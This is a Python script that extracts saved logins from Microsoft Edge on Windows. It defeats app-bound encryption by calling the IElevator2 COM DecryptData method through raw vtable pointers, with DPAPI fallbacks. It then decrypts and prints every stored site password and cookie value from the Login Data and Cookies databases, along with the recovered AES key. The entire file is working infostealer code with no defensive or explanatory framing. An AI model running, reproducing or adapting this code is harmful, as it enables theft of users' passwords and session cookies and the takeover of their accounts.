#!/usr/bin/env python3
import json, base64, os, sqlite3, struct, ctypes, tempfile, shutil
from ctypes import wintypes
from Crypto.Cipher import AES

# ── COM setup via comtypes ──
import comtypes
import comtypes.client
from comtypes import GUID

# Edge IElevator2 COM interface
CLSID_Edge = GUID("{1FCBE96C-1697-43AF-9140-2897C7C69767}")
IID_IElevator2 = GUID("{8F7B6792-784D-4047-845D-1782EFBEF205}")

# Define the COM vtable using ctypes
class IUnknown(ctypes.c_void_p):
    pass

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.c_void_p)]

def dpapi_unprotect(data):
    """Call CryptUnprotectData (current user context)."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.c_char_p)]
    
    crypt32 = ctypes.windll.crypt32
    input_blob = DATA_BLOB()
    input_blob.cbData = len(data)
    input_blob.pbData = ctypes.cast(ctypes.create_string_buffer(data), ctypes.c_char_p)
    
    output_blob = DATA_BLOB()
    result = crypt32.CryptUnprotectData(
        ctypes.byref(input_blob), None,
        None, None, None, 0,
        ctypes.byref(output_blob)
    )
    if not result:
        raise OSError(f"CryptUnprotectData failed: {ctypes.GetLastError()}")
    
    output = ctypes.string_at(output_blob.pbData, output_blob.cbData)
    ctypes.windll.kernel32.LocalFree(output_blob.pbData)
    return output

def elevator_decrypt(encrypted_data):
    """Call IElevator2 DecryptData via comtypes."""
    comtypes.CoInitialize()
    try:
        # Create the COM object
        elevator = comtypes.client.CreateObject(CLSID_Edge, interface=IUnknown, clsctx=comtypes.CLSCTX_LOCAL_SERVER)
        
        # We need to call DecryptData (vtable slot 5)
        # Using ctypes to call through the vtable
        vtable = ctypes.cast(elevator.value, ctypes.POINTER(ctypes.c_void_p)).contents
        vtable_ptr = ctypes.cast(ctypes.byref(vtable), ctypes.POINTER(ctypes.c_void_p))
        
        # Get the vtable array
        vtbl = ctypes.cast(elevator, ctypes.POINTER(ctypes.POINTER(ctypes.c_void_p))).contents
        # DecryptData is at index 5 (after QI, AddRef, Release, RunRecovery, EncryptData)
        decrypt_func = ctypes.cast(vtbl[5], ctypes.c_void_p)
        
        # Define the function prototype: HRESULT DecryptData(BLOB* cipher, BLOB* plain, DWORD* err)
        prototype = ctypes.WINFUNCTYPE(
            ctypes.HRESULT,           # return
            ctypes.c_void_p,          # this (implicit in COM but needed for stdcall)
            ctypes.POINTER(BLOB),     # cipher blob
            ctypes.POINTER(BLOB),     # plain blob
            ctypes.POINTER(wintypes.DWORD)  # last error
        )
        func = prototype(decrypt_func)
        
        input_blob = BLOB()
        input_blob.cbData = len(encrypted_data)
        input_blob.pbData = ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p)
        
        output_blob = BLOB()
        last_error = wintypes.DWORD()
        
        # Call DecryptData (thiscall: this pointer passed via ecx on x86, but on x64 via rcx)
        # For x64 COM, the calling convention is Microsoft x64 (this in rcx)
        hr = func(elevator, ctypes.byref(input_blob), ctypes.byref(output_blob), ctypes.byref(last_error))
        
        if hr != 0:
            raise OSError(f"DecryptData failed: HRESULT 0x{hr:08X}, lastError={last_error.value}")
        
        if output_blob.cbData == 0:
            raise ValueError("DecryptData returned empty")
        
        return ctypes.string_at(output_blob.pbData, output_blob.cbData)
    finally:
        comtypes.CoUninitialize()

def decrypt_chromium_password(blob, aes_key):
    """Decrypt v10/v20 password blob."""
    if not blob or len(blob) < 3:
        return None
    version = blob[:3]
    if version == b'v10':
        nonce = blob[3:15]
        ct = blob[15:-16]
        tag = blob[-16:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag).decode('utf-8', errors='replace')
    elif version == b'v20':
        # v20: blob[3:] is encrypted with the ABE key
        encrypted = blob[3:]
        nonce = encrypted[:12]
        ct = encrypted[12:-16]
        tag = encrypted[-16:]
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ct, tag).decode('utf-8', errors='replace')
    return None

def main():
    user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\admin')
    edge_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')
    local_state_path = os.path.join(edge_path, 'Local State')
    
    # 1. Read Local State
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    os_crypt = local_state.get('os_crypt', {})
    
    # 2. Get the v20 AES key via IElevator
    ab_key_b64 = os_crypt.get('app_bound_encrypted_key', '')
    print(f"[*] app_bound key: {len(ab_key_b64)} chars")
    
    ab_key_bytes = base64.b64decode(ab_key_b64)
    # Strip APPB magic
    dpapi_blob = ab_key_bytes[4:]
    
    # 3. Decrypt the v20 key
    print("[*] Decrypting ABE key via IElevator COM...")
    try:
        aes_key = elevator_decrypt(dpapi_blob)
        print(f"[+] AES key: {aes_key.hex()}")
    except Exception as e:
        print(f"[-] IElevator failed: {e}")
        # Fallback: try user DPAPI directly
        try:
            aes_key = dpapi_unprotect(dpapi_blob)
            print(f"[+] User DPAPI key: {aes_key.hex()}")
        except Exception as e2:
            print(f"[-] User DPAPI also failed: {e2}")
            # Try the v10 key as last resort
            enc_key = os_crypt.get('encrypted_key', '')
            if enc_key:
                enc_bytes = base64.b64decode(enc_key)
                aes_key = dpapi_unprotect(enc_bytes[5:])
                print(f"[+] v10 key: {aes_key.hex()}")
            else:
                return
    
    # 4. Decrypt passwords from Login Data
    login_db = os.path.join(edge_path, 'Default', 'Login Data')
    tmp_db = os.path.join(tempfile.gettempdir(), f"ld_{os.getpid()}")
    shutil.copy2(login_db, tmp_db)
    
    conn = sqlite3.connect(tmp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY date_created DESC")
    
    print(f"\n{'='*80}")
    print(f"{'Site':<50} {'Username':<30} {'Password'}")
    print(f"{'='*80}")
    
    for url, username, pw_blob in cursor.fetchall():
        if pw_blob:
            try:
                password = decrypt_chromium_password(pw_blob, aes_key)
            except Exception as e:
                password = f"<error: {e}>"
        else:
            password = None
        
        print(f"{(url or '?'):<50} {(username or '?'):<30} {password}")
    
    conn.close()
    os.remove(tmp_db)
    
    # 5. Decrypt cookies
    cookie_db = os.path.join(edge_path, 'Default', 'Network', 'Cookies')
    if os.path.exists(cookie_db):
        shutil.copy2(cookie_db, tmp_db)
        conn = sqlite3.connect(tmp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE encrypted_value IS NOT NULL AND length(encrypted_value) > 3")
        
        print(f"\n{'='*80}")
        print("COOKIES:")
        
        for host, name, enc_val in cursor.fetchall():
            try:
                val = decrypt_chromium_password(enc_val, aes_key)
                if val:
                    print(f"  {host:40s} {name:30s} = {val[:60]}")
            except:
                pass
        
        conn.close()
        os.remove(tmp_db)

if __name__ == '__main__':
    main()